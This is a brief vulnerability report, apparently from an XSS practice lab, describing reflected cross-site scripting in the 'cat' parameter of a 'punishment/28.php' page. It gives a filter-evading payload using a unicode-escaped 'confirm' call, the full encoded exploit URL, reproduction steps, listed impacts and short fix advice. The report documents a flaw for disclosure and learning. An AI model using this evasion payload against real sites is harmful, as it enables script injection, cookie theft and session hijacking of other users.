# Reflected Cross-Site Scripting (XSS) via `cat` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `cat` parameter of the application. User-supplied input is reflected into the response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="a1f9kd"
http://kzlabs.com/punishment/28.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="v7m2qp"
cat
```

---

## Payload Used

```html id="d4x8sl"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/punishment/28.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected into the response.

3. The JavaScript executes automatically and triggers a popup dialog.

---

## Proof of Concept

```text id="q5n1be"
http://kzlabs.com/punishment/28.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/48e86894-553e-4fe0-a3a6-8cbde7b56540" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
